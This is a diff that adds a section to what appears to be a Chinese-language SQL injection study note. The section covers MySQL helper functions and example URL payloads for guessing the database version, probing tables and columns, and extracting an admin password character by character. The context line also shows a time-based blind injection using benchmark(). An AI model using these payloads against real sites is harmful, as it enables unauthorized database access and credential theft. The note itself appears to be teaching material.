@@ -49,5 +49,33 @@ sleep(seconds)，休眠seconds秒。
 10 union select if(substring(current,1,1)=char(119),benchmark(5000000,md5(1)) from (select database() as current) as tbl;
 ```
 
+## 数据库攻击技巧
+
+### 便利函数
+
+database\(\) - 返回当前数据库名。
+
+system\_user\(\) - 返回数据库的系统用户。
+
+current\_user\(\) - 返回当前用户身份。
+
+version\(\) - 数据库版本号。
+
+### 常见技巧
+
+猜解数据库版本：?id = 5 and substring\(@@version,1,1\)=4
+
+判断表是否存在：?id = 5 union all select 1,2,3 from 表名
+
+判断表中某列是否存在：?id = 5 union all select 1,2,列名 from 某表
+
+具体猜解列中数据：?id = 5 and ascii\(substring\(\(select passwd from admin limit 0,1\),1,1\)&gt;64\) **二分法**
+
+### 流程
+
+
+
+
+
 
 
